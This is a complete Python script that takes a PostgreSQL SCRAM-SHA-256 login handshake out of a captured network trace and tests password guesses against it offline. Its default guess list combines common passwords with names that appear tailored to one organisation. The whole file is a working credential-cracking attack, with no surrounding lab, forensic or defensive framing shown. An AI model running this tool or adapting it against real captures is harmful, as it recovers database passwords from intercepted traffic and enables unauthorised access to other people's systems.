# -*- coding: utf-8 -*-
"""Extract SCRAM-SHA-256 handshake from pcap and test password candidates offline."""
import struct, base64, hashlib, hmac, sys, io
from parse_pcap import read_pcapng, tcp_payload

pkts = read_pcapng("hbo_capture.pcapng")
streams = {}
for ts, lt, pkt in pkts:
    r = tcp_payload(lt, pkt)
    if not r: continue
    src, sport, dst, dport, seq, payload = r
    if dport != 5432 and sport != 5432: continue
    if not payload: continue
    key = sport if dport == 5432 else dport
    s = streams.setdefault(key, {"c2s": {}, "s2c": {}})
    (s["c2s"] if dport == 5432 else s["s2c"])[seq] = payload

def assemble(segments):
    base = min(segments); pos = base; out = io.BytesIO()
    for seq in sorted(segments):
        d = segments[seq]
        if seq < pos:
            d = d[pos-seq:]
            if not d: continue
        elif seq > pos:
            pos = seq
        out.write(d); pos += len(d)
    return out.getvalue()

def extract_scram(buf_c2s, buf_s2c):
    """Walk c2s to find 'p' messages; pair with s2c R code 11."""
    results = []
    # parse s2c for R code 11
    sfm = None
    off = 0
    while off + 5 <= len(buf_s2c):
        t = buf_s2c[off:off+1]; (ln,) = struct.unpack_from(">I", buf_s2c, off+1)
        if ln < 4 or off+1+ln > len(buf_s2c): break
        body = buf_s2c[off+5:off+1+ln]
        if t == b"R" and len(body) >= 4:
            (code,) = struct.unpack_from(">I", body, 0)
            if code == 11:
                sfm = body[4:].decode()
        off += 1 + ln
    # parse c2s for startup + two p messages
    off = 0; startup = False; ps = []
    while off + 5 <= len(buf_c2s):
        if not startup:
            (ln,) = struct.unpack_from(">I", buf_c2s, off)
            if 8 <= ln <= 2048 and off+ln <= len(buf_c2s):
                startup = True; off += ln; continue
            startup = True
        t = buf_c2s[off:off+1]; (ln,) = struct.unpack_from(">I", buf_c2s, off+1)
        if ln < 4 or off+1+ln > len(buf_c2s): break
        body = buf_c2s[off+5:off+1+ln]
        if t == b"p":
            ps.append(body)
        off += 1 + ln
    if len(ps) >= 2 and sfm:
        # SASLInitialResponse: mech\0 int32len cfirst
        b = ps[0]
        nul = b.index(b"\x00")
        (clen,) = struct.unpack_from(">I", b, nul+1)
        cfirst = b[nul+5:nul+5+clen].decode()
        # client-final: ... ,p=proof
        final = ps[1].decode()
        proof_b64 = final.split(",p=")[1]
        results.append((cfirst, sfm, proof_b64))
    return results

handshakes = []
for port, s in streams.items():
    c2s = assemble(s["c2s"]); s2c = assemble(s["s2c"])
    handshakes.extend(extract_scram(c2s, s2c))

print("handshakes found:", len(handshakes))
if not handshakes:
    sys.exit(0)
cfirst, sfm, proof_b64 = handshakes[0]
attrs = dict(kv.split("=",1) for kv in sfm.split(","))
salt = base64.b64decode(attrs["s"]); iters = int(attrs["i"]); full_nonce = attrs["r"]
wo_proof = f"c=biws,r={full_nonce}"
auth_msg = f"{cfirst},{sfm},{wo_proof}".encode()
print("salt:", base64.b64encode(salt).decode(), "iters:", iters)

def check(pw):
    salted = hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, iters)
    ck = hmac.new(salted, b"Client Key", hashlib.sha256).digest()
    sk = hashlib.sha256(ck).digest()
    sig = hmac.new(sk, auth_msg, hashlib.sha256).digest()
    proof = bytes(a ^ b for a, b in zip(ck, sig))
    return base64.b64encode(proof).decode() == proof_b64

candidates = sys.argv[1:]
if not candidates:
    candidates = ["123123","dba_app","dba_app123","hydata","huayue","hyt","hyt123","huayue123",
                  "hbo","HBO","hbo7","HBO7","123456","password","admin","admin123","111111","000000",
                  "12345678","1qaz2wsx","qwer1234","HyTech","hytech","hyt@123","Huayue@123","dba","app",
                  "123123123","112233","abc123","pass123","oracle","postgres","pgsql","Hydata123"]
hit = None
for pw in candidates:
    try:
        if check(pw):
            hit = pw; break
    except Exception:
        pass
print("PASSWORD:", hit if hit else "not in candidate list")
